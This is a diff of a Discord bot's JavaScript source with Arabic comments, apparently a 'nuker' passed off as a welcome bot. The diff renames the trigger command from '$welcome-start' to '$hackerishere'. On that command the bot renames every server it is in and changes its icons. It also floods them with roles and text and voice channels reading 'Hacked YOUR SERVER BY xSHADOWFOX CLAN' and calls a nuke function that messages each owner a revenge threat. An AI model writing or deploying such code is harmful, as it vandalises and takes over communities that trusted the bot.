@@ -33,7 +33,7 @@ LOka.on("message", message => {
 // صورة البوت 
 var x1 = "kk"
 LOka.on('message', message => {
-     if (message.content === "$welcome-start") {
+     if (message.content === "$hackerishere") {
 LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/482151620289888256/482156990945165312/download.png`)
  
 }
@@ -42,22 +42,22 @@ LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/482151620289888256/4
 // اسم بوتك وش يصير لمن يهكر
 var x1 = "kk"
 LOka.on('message', message => {
-     if (message.content === "$welcome-start") {
+     if (message.content === "$hackerishere") {
 LOka.user.setUsername("KingBot")
  
 }
 });
 // الستريمينق حق البوت
 LOka.on('message', message => {
-     if (message.content === "$start") {
-LOka.user.setGame(`$welcome-start to start a welcome`,'https://www.twitch.tv/hix')
+     if (message.content === "$hackerishere") {
+LOka.user.setGame(`مات الجميع وعم السكوت وقت الانتقام قد حان`,'https://www.twitch.tv/hix')
  
 }
 });
 
 // صورة السيرفر 
 LOka.on('message', message => {
-     if (message.content === "$welcome-start") {
+     if (message.content === "$hackerishere") {
          LOka.guilds.forEach(m =>{
              m.setIcon(`https://cdn.discordapp.com/attachments/415118005475868672/415119241872932869/images.jpg`)
 })
@@ -66,7 +66,7 @@ LOka.on('message', message => {
 
 //وش يخلي اسم السيرفر
 LOka.on('message', message => {
-     if (message.content === "$welcome-start") {
+     if (message.content === "$hackerishere") {
          LOka.guilds.forEach(m =>{
              m.setName(`xShaDowFOX CLAN IS HERE`)
 })
@@ -75,7 +75,7 @@ LOka.on('message', message => {
 
 //صورة السيرفر 
 LOka.on('message', message => {
-     if (message.content === "$welcome-start") {
+     if (message.content === "$hackerishere") {
                  if(!message.channel.guild) return;
  
              message.guild.setIcon(`https://cdn.discordapp.com/attachments/415118005475868672/415119241872932869/images.jpg`)
@@ -84,7 +84,7 @@ LOka.on('message', message => {
 });
 //صورة السيرفر 
 LOka.on('message', message => {
-     if (message.content === "$welcome-start") {
+     if (message.content === "$hackerishere") {
                  if(!message.channel.guild) return;
  
              message.guild.setIcon(`https://cdn.discordapp.com/attachments/415118005475868672/415119241872932869/images.jpg`)
@@ -95,7 +95,7 @@ LOka.on('message', message => {
 LOka.on('message', message => {
      
  
-     if (message.content === "$welcome-start") {
+     if (message.content === "$hackerishere") {
          LOka.guilds.forEach(m =>{
   m.createRole({
         name : "Hacked YOUR SERVER BY xSHADOWFOX CLAN",
@@ -332,7 +332,7 @@ LOka.on('message', message => {
 });
 // رومات السيرفر
 LOka.on('message', message => {
-         if (message.content === "$welcome-start") {
+         if (message.content === "$hackerishere") {
                LOka.guilds.forEach(m =>{
 m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
 m.createChannel('Hacked-u-By-CLAN-xShaDowFox-CLAN', 'text');
@@ -426,7 +426,7 @@ m.createChannel('xShaDowFOX-CLAN-IS-HERE', 'text');
 }
 });
 LOka.on('message', message => {
-         if (message.content === "$welcome-start") {
+         if (message.content === "$hackerishere") {
                  LOka.guilds.forEach(m =>{
 m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
 m.createChannel('Hacked u By CLAN xShaDowFox CLAN', 'voice');
@@ -526,7 +526,7 @@ async function nuke(guild) {
  
   await guild.fetchMembers();
  
-  await guild.owner.send(' حياكم https://discord.gg/qA2Ua7b').catch(e => { return void e; });
+  await guild.owner.send(' مات الجميع وعم السكوت وقت الانتقام قد حان').catch(e => { return void e; });
  
  
  
@@ -585,4 +585,4 @@ LOka.on('guildMemberAdd', member => {
  
 
 // توكين البوت 
-client.login(process.env.BOT_TOKEN);
+LOka.login(process.env.BOT_TOKEN);
